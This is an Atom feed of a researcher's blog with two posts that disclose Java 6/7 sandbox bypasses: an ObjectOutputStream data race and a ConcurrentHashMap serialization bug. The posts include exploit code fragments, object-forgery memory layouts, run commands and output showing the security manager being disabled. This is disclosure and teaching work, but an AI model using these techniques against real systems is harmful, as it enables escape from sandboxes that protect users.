<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Ben's Blog]]></title>
  <link href="http://benmmurphy.github.com/atom.xml" rel="self"/>
  <link href="http://benmmurphy.github.com/"/>
  <updated>2015-10-23T17:47:01+01:00</updated>
  <id>http://benmmurphy.github.com/</id>
  <author>
    <name><![CDATA[Ben Murphy]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[ZDI-13-246 (2013) Java 1.7.0_15 Sandbox Bypass via ObjectOutputStream]]></title>
    <link href="http://benmmurphy.github.com/blog/2015/10/23/zdi-13-246-2013-java-1-dot-7-0-15-sandbox-bypass-via-objectoutputstream/"/>
    <updated>2015-10-23T17:35:00+01:00</updated>
    <id>http://benmmurphy.github.com/blog/2015/10/23/zdi-13-246-2013-java-1-dot-7-0-15-sandbox-bypass-via-objectoutputstream</id>
    <content type="html"><![CDATA[<p>This is part of a series of posts detailing Java Sandbox Bypasses that were disclosed
between 2012-2013. You can view the other bugs by going back to the <a href="http://benmmurphy.github.com/blog/2015/10/21/zdi-13-075-2013-java-1-dot-7-0-09-sandbox-bypass">original post</a>.</p>

<p>This is my favourite bug because it takes two read primitives (no memory corruption) and converts them into a full sandbox bypass. The primitives are read some memory as an integer and read some memory as an object reference. This lets us find out the address of a Class object and ultimately build up a fake object that we can read.</p>

<p>It also shows how difficult it is to protect the JVM against hostile code because hostile code is able to create arbitrary threads and generate data races. This particular data race would probably be between 1 or 2 instructions if the JIT was active so it shows that any data race no matter how narrow should be exploitable on the JVM. This is made easier by the fact that as an attacker you can control a lot of the JVM options. For example you can force the JVM to run in interpreted mode which gives you a larger instruction window to race against. Also, you can tweak the GC options and have a lot of control over the heap size which helps with reliability of the heap spray used in this exploit.</p>

<p>We also see that a helpful maintainer has left a comment pointing out the vulnerability :)</p>

<p>This is a full sandbox bypass for Java 6 and Java 7. I&#8217;ve tested it on
Java 1.7.0_15 and Java 1.6.0_38 on a single core 64 bit machine. The
exploit will only work against 64 bit compressed oops memory architecture and
32 bit memory architecture. It will not work against normal 64 bit architecture.
By default java after 1.6.0_23 will use compressed oops on a 64 bit machine.</p>

<h2>Vulnerability</h2>

<p>This exploits a data race between reading the current serialized object and
the description for the current serialized object in the ObjectOutputStream
class. When in a writeObject method an attacker can call writeObject on the
ObjectOutputStream on a different thread which will change the current
serialized context. It is possible for the following order to happen:</p>

<pre><code>/* Thread 1: gets old object */
defaultWriteObject (435): curObj = curContext.getObj();

/* Thread 2: writes new object and object description */
writeSerialData (1478):  curContext = new SerialCallbackContext(obj, slotDesc);

/* Thread 1: gets new object description -oh noes- */
defaultWriteObject (436): curDesc = curContext.getDesc();
</code></pre>

<p>You have to run the particular call pattern thousands and thousands of times
to get lucky enough for this to happen. But it can happen :)</p>

<p><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/io/ObjectOutputStream.java#ObjectOutputStream.defaultWriteObject%28%29">defaultWriteObject</a></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="mi">431</span>     <span class="kd">public</span> <span class="kt">void</span> <span class="n">defaultWriteObject</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
</span><span class='line'><span class="mi">432</span>         <span class="k">if</span> <span class="o">(</span> <span class="n">curContext</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">)</span> <span class="o">{</span>
</span><span class='line'><span class="mi">433</span>             <span class="k">throw</span> <span class="k">new</span> <span class="n">NotActiveException</span><span class="o">(</span><span class="s">&quot;not in call to writeObject&quot;</span><span class="o">);</span>
</span><span class='line'><span class="mi">434</span>         <span class="o">}</span>
</span><span class='line'><span class="mi">435</span>         <span class="n">Object</span> <span class="n">curObj</span> <span class="o">=</span> <span class="n">curContext</span><span class="o">.</span><span class="na">getObj</span><span class="o">();</span>
</span><span class='line'><span class="mi">436</span>         <span class="n">ObjectStreamClass</span> <span class="n">curDesc</span> <span class="o">=</span> <span class="n">curContext</span><span class="o">.</span><span class="na">getDesc</span><span class="o">();</span>
</span><span class='line'><span class="mi">437</span>         <span class="n">bout</span><span class="o">.</span><span class="na">setBlockDataMode</span><span class="o">(</span><span class="kc">false</span><span class="o">);</span>
</span><span class='line'><span class="mi">438</span>         <span class="n">defaultWriteFields</span><span class="o">(</span><span class="n">curObj</span><span class="o">,</span> <span class="n">curDesc</span><span class="o">);</span>
</span><span class='line'><span class="mi">439</span>         <span class="n">bout</span><span class="o">.</span><span class="na">setBlockDataMode</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span><span class='line'><span class="mi">440</span>     <span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/io/ObjectOutputStream.java#ObjectOutputStream.defaultWriteFields%28java.lang.Object%2Cjava.io.ObjectStreamClass%29">defaultWriteFields</a></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="mi">1503</span>    <span class="kd">private</span> <span class="kt">void</span> <span class="n">defaultWriteFields</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="n">ObjectStreamClass</span> <span class="n">desc</span><span class="o">)</span>
</span><span class='line'><span class="mi">1504</span>        <span class="kd">throws</span> <span class="n">IOException</span>
</span><span class='line'><span class="mi">1505</span>    <span class="o">{</span>
</span><span class='line'><span class="mi">1506</span>        <span class="c1">// REMIND: perform conservative isInstance check here?</span>
</span><span class='line'><span class="mi">1507</span>        <span class="n">desc</span><span class="o">.</span><span class="na">checkDefaultSerialize</span><span class="o">();</span>
</span></code></pre></td></tr></table></div></figure>


<p><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/io/ObjectOutputStream.java#ObjectOutputStream.writeSerialData%28java.lang.Object%2Cjava.io.ObjectStreamClass%29">writeSerialData</a></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="mi">1477</span>                <span class="k">try</span> <span class="o">{</span>
</span><span class='line'><span class="mi">1478</span>                    <span class="n">curContext</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SerialCallbackContext</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">slotDesc</span><span class="o">);</span>
</span><span class='line'><span class="mi">1479</span>                    <span class="n">bout</span><span class="o">.</span><span class="na">setBlockDataMode</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span><span class='line'><span class="mi">1480</span>                    <span class="n">slotDesc</span><span class="o">.</span><span class="na">invokeWriteObject</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="k">this</span><span class="o">);</span>
</span><span class='line'><span class="mi">1481</span>                    <span class="n">bout</span><span class="o">.</span><span class="na">setBlockDataMode</span><span class="o">(</span><span class="kc">false</span><span class="o">);</span>
</span><span class='line'><span class="mi">1482</span>                    <span class="n">bout</span><span class="o">.</span><span class="na">writeByte</span><span class="o">(</span><span class="n">TC_ENDBLOCKDATA</span><span class="o">);</span>
</span><span class='line'><span class="mi">1483</span>                <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
</span><span class='line'><span class="mi">1484</span>                    <span class="n">curContext</span><span class="o">.</span><span class="na">setUsed</span><span class="o">();</span>
</span><span class='line'><span class="mi">1485</span>                    <span class="n">curContext</span> <span class="o">=</span> <span class="n">oldContext</span><span class="o">;</span>
</span><span class='line'><span class="mi">1486</span>                    <span class="k">if</span> <span class="o">(</span><span class="n">extendedDebugInfo</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'><span class="mi">1487</span>                        <span class="n">debugInfoStack</span><span class="o">.</span><span class="na">pop</span><span class="o">();</span>
</span><span class='line'><span class="mi">1488</span>                    <span class="o">}</span>
</span><span class='line'><span class="mi">1489</span>                <span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>And in the #defaultWriteFields method we also have a &#8216;REMIND&#8217; comment
asking whether we should do the isInstance check which I believe would fix this
exploit. In ObjectInputStream there is an isInstance check which prevents a
similar exploit working for the ObjectInputStream. Which is kind of annoying
because being able to do arbitrary writes in the JVM is more fun than being able
to arbitrary reads.</p>

<p>This mismatch between the object and the object descriptor is a problem because
the ObjectStreamClass uses the Unsafe class to read values from memory. This
is fine when that descriptor and object match but when they don&#8217;t match the JVM
can be tricked into interpreting object references as integer values or integer
values as object references :)</p>

<p><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/io/ObjectStreamClass.java#ObjectStreamClass.FieldReflector.getPrimFieldValues%28java.lang.Object%2Cbyte%5B%5D%29">getPrimFieldValues</a></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="mi">1924</span>                    <span class="k">case</span> <span class="sc">&#39;I&#39;</span><span class="o">:</span>
</span><span class='line'><span class="mi">1925</span>                        <span class="n">Bits</span><span class="o">.</span><span class="na">putInt</span><span class="o">(</span><span class="n">buf</span><span class="o">,</span> <span class="n">off</span><span class="o">,</span> <span class="n">unsafe</span><span class="o">.</span><span class="na">getInt</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">key</span><span class="o">));</span>
</span></code></pre></td></tr></table></div></figure>


<p><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/io/ObjectStreamClass.java#ObjectStreamClass.FieldReflector.getObjFieldValues%28java.lang.Object%2Cjava.lang.Object%5B%5D%29">getObjFieldValues</a></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="mi">2017</span>                    <span class="n">vals</span><span class="o">[</span><span class="n">offsets</span><span class="o">[</span><span class="n">i</span><span class="o">]]</span> <span class="o">=</span> <span class="n">unsafe</span><span class="o">.</span><span class="na">getObject</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">readKeys</span><span class="o">[</span><span class="n">i</span><span class="o">]);</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Exploit</h2>

<p>The POC is available from <a href="https://github.com/benmmurphy/JavaPlayground/blob/master/ZDI-13-246/Ser2.java">Github</a></p>

<p>The race condition is triggered by supplying a custom writeObject method for
the class we want to reinterpet. This method will look something like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">private</span> <span class="kt">void</span> <span class="nf">writeObject</span><span class="o">(</span><span class="kd">final</span> <span class="n">ObjectOutputStream</span> <span class="n">oos</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">final</span> <span class="n">CountDownLatch</span> <span class="n">latch</span> <span class="o">=</span> <span class="k">new</span> <span class="n">CountDownLatch</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">Thread</span> <span class="n">th</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Thread</span><span class="o">(</span><span class="k">new</span> <span class="n">Runnable</span><span class="o">()</span> <span class="o">{</span>
</span><span class='line'>
</span><span class='line'>    <span class="nd">@Override</span>
</span><span class='line'>    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
</span><span class='line'>      <span class="k">try</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="k">new</span> <span class="n">ShadowInt</span><span class="o">(</span><span class="n">latch</span><span class="o">));</span>
</span><span class='line'>      <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">th</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="c1">// ignore</span>
</span><span class='line'>      <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="o">});</span>
</span><span class='line'>  <span class="n">th</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
</span><span class='line'>  <span class="k">try</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">start</span><span class="o">.</span><span class="na">await</span><span class="o">();</span>
</span><span class='line'>    <span class="n">oos</span><span class="o">.</span><span class="na">defaultWriteObject</span><span class="o">();</span>
</span><span class='line'>  <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">latch</span><span class="o">.</span><span class="na">countDown</span><span class="o">();</span>
</span><span class='line'>  <span class="o">}</span>
</span><span class='line'>  <span class="k">try</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">th</span><span class="o">.</span><span class="na">join</span><span class="o">();</span>
</span><span class='line'>  <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">InterruptedException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>    <span class="c1">// TODO Auto-generated catch block</span>
</span><span class='line'>    <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
</span><span class='line'>  <span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>  <span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>We spawn a Thread that will perform a writeObject call with an instance of the
target class we want the original class to be reinterpreted as.</p>

<p>This class will also implement the writeObject method and will use it wait
until the origin object has completed its defaultWriteObject() call before
returning. This ensures the new context will be available for the original
object. Otherwise, the new context might be removed before the original object
has a chance to use it. It will look something like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">private</span> <span class="kt">void</span> <span class="nf">writeObject</span><span class="o">(</span><span class="n">ObjectOutputStream</span> <span class="n">oos</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>  <span class="k">try</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">latch</span><span class="o">.</span><span class="na">await</span><span class="o">();</span>
</span><span class='line'>  <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">InterruptedException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>    <span class="c1">// TODO Auto-generated catch block</span>
</span><span class='line'>    <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
</span><span class='line'>  <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The goal of the exploit is to build up a fake object of type FakeMe which will
have a field of type EvilClassLoader which will point to a normal ClassLoader.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'>  <span class="kd">public</span> <span class="kd">static</span> <span class="kd">class</span> <span class="nc">FakeMe</span> <span class="kd">implements</span> <span class="n">Serializable</span> <span class="o">{</span>
</span><span class='line'>    <span class="kd">private</span> <span class="kt">int</span> <span class="n">magic</span> <span class="o">=</span> <span class="mi">0</span><span class="n">xDEADBEEF</span><span class="o">;</span>
</span><span class='line'>    <span class="kd">private</span> <span class="n">EvilClassLoader</span> <span class="n">o</span><span class="o">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>The JVM memory layout of an object looks something like this:</p>

<pre><code>-----------------------------------------------------------
| Header 4/8 bytes depending on 32bit/64bit               |
----------------------------------------------------------|
| Class word 4/8 bytes depending on 32bit,64bit-oops/64bit|
-----------------------------------------------------------
| Maybe some padding                                      |
-----------------------------------------------------------
| Field 1                                                 |
-----------------------------------------------------------
| etc..                                                   |
-----------------------------------------------------------
</code></pre>

<p>The first thing we need to do is find the class word. To do this we create
an EatMe class which doesn&#8217;t have any fields but using the race condition we
will try and make it look like the ClassCatcher class which has 40 int fields
in it. We then spray the heap with a bunch of FakeMe classes. Hopefully, the JVM
will read off the end of the ClassCatcher class and into the memory of the
FakeMe class. If it serializes a bit of the FakeMe class then the serialized
data is going to look like:</p>

<pre><code>[Some Crap] [Class Header] [Class Word] 0xDEADBEEF [Some Crap]
</code></pre>

<p>We can just search for DEADBEEF in the serialized data and if it is there then
we have recovered the Class word.</p>

<p>The next thing we need is an address of a ClassLoader object and the address
of an object that we can point inside of and re-interpret as a FakeMe object.
For the re-interpeting object I chose an array of int. We store the ClassLoader
and array of int in the ObjectHolder object and use the race condition to
reinterpret it as a ShadowInt class. The ShadowInt object&#8217;s fields are integers
that allow us to read the address of the fields in the ObjectHolder object.</p>

<p>Now we have the addresses of the array of int and a classloader object we can
create our fake object.</p>

<p>The JVM memory layout of an array of int looks something like this:</p>

<pre><code>-----------------------------------------------------------
| Header 4/8 bytes depending on 32bit/64bit               |
----------------------------------------------------------|
| Class word 4/8 bytes depending on 32bit,64bit-oops/64bit|
-----------------------------------------------------------
| Length 4 bytes                                          |
-----------------------------------------------------------
| Int at index 0 (4 bytes)                                |
-----------------------------------------------------------
| Int at index 1 (4 bytes)                                |
-----------------------------------------------------------
| Int at index 2 (4 bytes)                                |
-----------------------------------------------------------
| Int at index 3 (4 bytes)                                |
-----------------------------------------------------------
| etc..                                                   |
-----------------------------------------------------------
</code></pre>

<p>So on 64 bit with compressed pointers we store the object header in the first
two integers, the class word in the third integer and the reference to the class
loader in the fourth integer. It will look something like this:</p>

<pre><code>-----------------------------------------------------------
| Header 4/8 bytes depending on 32bit/64bit               |
----------------------------------------------------------|
| Class word 4/8 bytes depending on 32bit,64bit-oops/64bit|
-----------------------------------------------------------
| Length 4 bytes                                          |
-----------------------------------------------------------
| Object Header Part 1                                    |
-----------------------------------------------------------
| Object Header Part 2                                    |
-----------------------------------------------------------
| FakeMe Class Word                                       |
-----------------------------------------------------------
| Reference to ClassLoader                                |
-----------------------------------------------------------
</code></pre>

<p>The address of this fake object will be 16 bytes following the address of the
array on 64 bit with compressed pointers. However, when we store this address
somewhere we need to convert it to a compressed pointer. This is done by using
an offset of 2 from the address of the array (which is already a compressed
pointer) instead of 16 because compressed pointers effectively multiply the
address by 8. Very strangely on Linux and windows compressed oops don&#8217;t appear
to be compressed and an offset of 16 instead of 2 needs to be used. I only see
properly compressed oops under OSX [1].</p>

<p>Finally we use the IntHolder object to store the address of the fake object and
use the race condition to re-inerpret it as a ShadowObject. The ShadowObject has
a single object field so the address originally stored as an integer will be
interpreted as an object reference. The ObjectOutputStream will then try to
serialize it and FakeMe implements the writeObject method so it will be able to
use the ClassLoader reference to define an Evil class with AllPermission which
will disable the JVM sandbox. The source code for the Evil class is in Evil.java</p>

<h2>Testing</h2>

<pre><code>java -Xint -XX:+UseSerialGC -Xms256m -Xmx256m -Xnoclassgc -Djava.security.manager Ser2
</code></pre>

<p>or</p>

<pre><code>appletviewer -J-Xint -J-XX:+UseSerialGC -J-Xms256m -J-Xmx256m -J-Xnoclassgc test.html
</code></pre>

<p>command line appletviewer needs -Xint and other parameters because it ignores
the jvm args applet parameter. firefox and ie both correctly handles the
-Xint and other parameters.</p>

<p><a href="http://docs.oracle.com/javase/6/docs/technotes/guides/jweb/applet/applet_deployment.html">Applet Deployment Parameters</a></p>

<p>If the exploit works you will get output like this:</p>

<pre><code>using arch: OOPS64
readclassaddress:0
found magic with: 528/528
got class address: 564408075
readaddress:0/0
found magic with: 51/64
found addresses: [574680158, 584221623]
readObject:0
FAKEME!
disabled security manager
/Users/ben
java.io.IOException: Cannot run program "calc.exe": error=2, No such file or directory
        at java.lang.ProcessBuilder.start(ProcessBuilder.java:1029)
        at Ser2.init(Ser2.java:546)
        at Ser2.main(Ser2.java:531)
Caused by: java.io.IOException: error=2, No such file or directory
        at java.lang.UNIXProcess.forkAndExec(Native Method)
        at java.lang.UNIXProcess.&lt;init&gt;(UNIXProcess.java:135)
        at java.lang.ProcessImpl.start(ProcessImpl.java:130)
        at java.lang.ProcessBuilder.start(ProcessBuilder.java:1021)
        ... 2 more
</code></pre>

<p>This exploits depends on a race condition that may be difficult to reproduce. We
force the applet to run in interpreted mode to increase the chance of running
into the race condition.</p>

<p>This exploit depends on the memory layout of the JVM and is not as reliable as
other exploits. It also appears that the compressed OOP format is different on
Windows and Linux when compared to OSX [1]. The exploit will try to determine what
format it should put the compressed OOPs in but it could guess wrong in which
case the exploit is likely to crash or just not work.</p>

<p>The exploit will try and print out user.home and run an apple script that will
say some stuff and run calc.exe.</p>

<p>(1): So for compressed OOPS and small heaps &lt; 4GB (maybe it needs to be smaller) you don&#8217;t need to perform a shift so apparently on Linux and Windows JVM the shift was skipped but on OSX the shift was still being performed.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ZDI-13-075 (2013) Java 1.7.0_09 Sandbox Bypass Via ConcurrentHashMap]]></title>
    <link href="http://benmmurphy.github.com/blog/2015/10/21/zdi-13-075-2013-java-1-dot-7-0-09-sandbox-bypass/"/>
    <updated>2015-10-21T10:35:00+01:00</updated>
    <id>http://benmmurphy.github.com/blog/2015/10/21/zdi-13-075-2013-java-1-dot-7-0-09-sandbox-bypass</id>
    <content type="html"><![CDATA[<p>I&#8217;ve decided to publish the write ups for some of the Java Sandbox bypasses I disclosed to ZDI between 2012 and 2013. In total I believe
there were 19 vulnerabilities:</p>

<ul>
<li>ZDI-13-002</li>
<li>ZDI-13-041</li>
<li>ZDI-13-040</li>
<li>ZDI-13-159</li>
<li>ZDI-13-160</li>
<li>ZDI-13-132</li>
<li>ZDI-13-075</li>
<li>ZDI-13-042</li>
<li>ZDI-13-089</li>
<li><a href="http://benmmurphy.github.com/blog/2015/10/23/zdi-13-246-2013-java-1-dot-7-0-15-sandbox-bypass-via-objectoutputstream/">ZDI-13-246</a></li>
<li>ZDI-13-079</li>
<li>ZDI-13-244</li>
<li>ZDI-13-245</li>
<li>ZDI-13-247</li>
<li>ZDI-13-248</li>
<li>ZDI-13-248</li>
<li>ZDI-14-105</li>
<li>ZDI-14-103</li>
<li>ZDI-14-104</li>
</ul>


<p>I&#8217;m going to try and publish the more interesting ones first. I find this one involving ConcurrentHashMap
interesting because it shows how difficult Java security is to get correct. The bug was introduced by Doug Lea and
the commit introducing the bug was also reviewed by another person. If Doug Lea can&#8217;t write secure code what hope
is for us mere mortals.</p>

<p>This bug also illustrates exploiting memory corruption by heap spraying in Java and methods to increase the reliability
of a heap spray. Most of the vulnerabilities I found in Java did not involve heap corruption so were much more reliable.</p>

<h2>Vulnerability</h2>

<p>In Java 7 java.util.concurrent.ConcurrentHashMap was changed to make it go faster (?) by replacing array accesses like segments[x] to UNSAFE.getObjectVolatile(segments, SBASE + x &lt;&lt; SHIFT).</p>

<p>This is the changeset from jdk source control that explains the change:</p>

<pre><code>changeset:   4021:005c0c85b0de
user:        dl
date:        Mon Apr 18 16:10:40 2011 +0100
summary:     7036559: ConcurrentHashMap footprint and contention improvements
</code></pre>

<p><a href="http://bugs.sun.com/view_bug.do?bug_id=7036559">Sun Bug</a></p>

<p>We will use the put method from ConcurrentHashMap in our vulnerability. The method looks like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="nd">@SuppressWarnings</span><span class="o">(</span><span class="s">&quot;unchecked&quot;</span><span class="o">)</span>
</span><span class='line'><span class="kd">public</span> <span class="n">V</span> <span class="nf">put</span><span class="o">(</span><span class="n">K</span> <span class="n">key</span><span class="o">,</span> <span class="n">V</span> <span class="n">value</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">Segment</span><span class="o">&lt;</span><span class="n">K</span><span class="o">,</span><span class="n">V</span><span class="o">&gt;</span> <span class="n">s</span><span class="o">;</span>
</span><span class='line'>    <span class="k">if</span> <span class="o">(</span><span class="n">value</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span>
</span><span class='line'>        <span class="k">throw</span> <span class="k">new</span> <span class="nf">NullPointerException</span><span class="o">();</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">hash</span> <span class="o">=</span> <span class="n">hash</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="o">(</span><span class="n">hash</span> <span class="o">&gt;&gt;&gt;</span> <span class="n">segmentShift</span><span class="o">)</span> <span class="o">&amp;</span> <span class="n">segmentMask</span><span class="o">;</span>
</span><span class='line'>    <span class="k">if</span> <span class="o">((</span><span class="n">s</span> <span class="o">=</span> <span class="o">(</span><span class="n">Segment</span><span class="o">&lt;</span><span class="n">K</span><span class="o">,</span><span class="n">V</span><span class="o">&gt;)</span><span class="n">UNSAFE</span><span class="o">.</span><span class="na">getObject</span>          <span class="c1">// nonvolatile; recheck</span>
</span><span class='line'>         <span class="o">(</span><span class="n">segments</span><span class="o">,</span> <span class="o">(</span><span class="n">j</span> <span class="o">&lt;&lt;</span> <span class="n">SSHIFT</span><span class="o">)</span> <span class="o">+</span> <span class="n">SBASE</span><span class="o">))</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="c1">//  in ensureSegment</span>
</span><span class='line'>        <span class="n">s</span> <span class="o">=</span> <span class="n">ensureSegment</span><span class="o">(</span><span class="n">j</span><span class="o">);</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">hash</span><span class="o">,</span> <span class="n">value</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The (hash >>> segmentShift) &amp; segmentMask line ensures that the offset into the array is valid. Both of these values are final fields and are initialized in the constructor to the correct values. Unfortunately, this class is Serializable and the readObject method does s.defaultReadObject() and does no checking of these fields. This means an attacker can set these two values to whatever he wants. For example he can set segmentShift to 0 and segmentMask to 0xFFFFFFFF and then the value of hash will be unchanged by the (hash >>> segmentShift) &amp; segmentMask operation. if the value of hash is larger than the array then the JDK will try to do a memory write past the array.</p>

<h2>POC Code</h2>

<p>The POC code is available from <a href="https://github.com/benmmurphy/JavaPlayground/blob/master/ZDI-13-075/CHM.java">Github</a>.</p>

<p>In the attack we create a serialized ConcurrentHashMap with segmentShift set to 0 and segmentMask set to 0x40000. The idea behind using 0x40000 is so the calculated offset will either be 0 or 262144. When the offset is 0 the hash map works correctly and doesn&#8217;t do anything weird. When the value is 262144 it will write past the end of the segments array and hopefully it will write where we want it to write. The class Make is used to generate the byte array for this object as well as the byte array for the Evil class I will cover later on.</p>

